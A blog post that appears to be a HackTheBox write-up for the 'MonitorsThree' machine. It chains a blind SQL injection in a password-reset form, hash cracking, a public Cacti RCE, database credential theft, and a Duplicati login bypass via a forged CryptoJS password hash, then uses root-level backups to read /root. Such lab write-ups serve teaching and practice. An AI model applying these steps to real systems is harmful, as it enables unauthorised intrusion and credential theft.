---
layout: post
title: "Monitors three"
date: 2024-12-28
categories: hackthebox
---


starting with nmap 

```bash
sudo nmap -sC -sV -p- -T4 -oN nmap monitorsthree.htb
```

![[Pasted image 20241009162037.png]]


nothing interesting just a website

vhost fuzzing
```bash
ffuf -H "Host: FUZZ.monitorsthree.htb" -u  http://monitorsthree.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -fs 13560
```

![[Pasted image 20241009162141.png]]

when I check this cacti website , I found that is vulnerable to an rce

![[Pasted image 20241009162253.png]]

https://github.com/thisisveryfunny/CVE-2024-25641-RCE-Automated-Exploit-Cacti-1.2.26

to exploit this we need creds 

so I start to enumerate the first website , on the `forget password` functionality , I found SQLi 


```payload
sss'
```

![[Pasted image 20241009162528.png]]

I tried to dump it manually , but it's blind so let's use sqlmap

```bash
sqlmap -r forgetpasssql --dbms mysql --dump --threads 10 -D monitorsthree_db -T users -C password --batch

# for the tables and colomuns I just guess them since  , to make it a bit faster 
```
![[Pasted image 20241009162709.png]]

![[Pasted image 20241009162725.png]]

let's crack them 
```bash
hashcat -a 0 -m 0 '31a181c8372e3afc59dab863430610e8'  /usr/share/wordlists/rockyou.txt 


31a181c8372e3afc59dab863430610e8:greencacti2001
```

I will use these creds to get foothold , I used msfconsoke for this 


and , I am in now 

![[Pasted image 20241009163450.png]]

search for cacti configuration file
```bash
www-data@monitorsthree:~/html/cacti/include$ cat config.php
```

![[Pasted image 20241009163758.png]]


![[Pasted image 20241009163853.png]]

```mysql
 mysql -u cactiuser -p 
 Enter password: cactiuser
```

on `user_auth` table , `cacti` db I found hashes for user
![[Pasted image 20241009165224.png]]

let's crack them 
```bash
hashcat -a 0 -m 3200 hash  /usr/share/wordlists/rockyou.txt

$2y$10$Fq8wGXvlM3Le.5LIzmM9weFs9s6W2i1FLg3yrdNGmkIaxo79IBjtK:12345678910
```

![[Pasted image 20241009165322.png]]

done with user .

```bash
netstat -ntlp
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:38441         0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:8200          0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:8084            0.0.0.0:*               LISTEN      -
tcp6       0      0 :::80                   :::*                    LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -
```

there's some intersting port running internally.

two port that got my interest 8200,8084

there's also another application in `/opt`

```bash
 cat docker-compose.yml
```

```yml
version: "3"

services:
  duplicati:
    image: lscr.io/linuxserver/duplicati:latest
    container_name: duplicati
    environment:
      - PUID=0
      - PGID=0
      - TZ=Etc/UTC
    volumes:
      - /opt/duplicati/config:/config
      - /:/source
    ports:
      - 127.0.0.1:8200:8200
    restart: unless-stopped
```

this application is running on docker , we can access it on port `8200` 

another interesting point is , this application can access host file in `/source`

```
/:/source
```

so let's forward it to our machine

I found the ssh key on marcus home
```bash
ssh -L 8200:localhost:8200 marcus@monitorsthree.htb -i marcus_ssh
```

![[Pasted image 20241009170104.png]]


this apps suffer from authentication bypass , I  [followed this article to bypass authentication ](https://medium.com/@STarXT/duplicati-bypassing-login-authentication-with-server-passphrase-024d6991e9ee)
grab the `Duplicati-server.sqlite`
```
scp -i marcus_ssh marcus@monitorsthree.htb:/opt/duplicati/config/Duplicati-server.sqlite  .
```

on the options table

```
Wb6e855L3sN9LTaCuwPXuautswTIQbekmMAr7BrK2Ho=
```

![[Pasted image 20241009170548.png]]

![[Pasted image 20241009170823.png]]

now we need to get the `nonce`

just intercept request and response on burp

![[Pasted image 20241009171733.png]]


intercept response of this 

![[Pasted image 20241009171808.png]]


now on the browser

```js
var noncedpwd = CryptoJS.SHA256(CryptoJS.enc.Hex.parse(CryptoJS.enc.Base64.parse('OkRXyoFZf/zvfu4F5kxLWflz0No73EybQDRsIAANnFQ=') + '59be9ef39e4bdec37d2d3682bb03d7b9abadb304c841b7a498c02bec1acad87a')).toString(CryptoJS.enc.Base64);
```

![[Pasted image 20241009172724.png]]

now send this as password


this website can backup any file/folder on the machine

so let's backup `/root`  remember  the app is running on docker to access files on the host machine we need to use `/source`


![[Pasted image 20241009173126.png]]
\
click on test connection to create folder
![[Pasted image 20241009173152.png]]

![[Pasted image 20241009173057.png]]


![[Pasted image 20241009173242.png]]


![[Pasted image 20241009173257.png]]

![[Pasted image 20241009173318.png]]


![[Pasted image 20241009173337.png]]


![[Pasted image 20241009173800.png]]


now we should find the root files on `/tmp/d0s3nt1`

![[Pasted image 20241009173831.png]]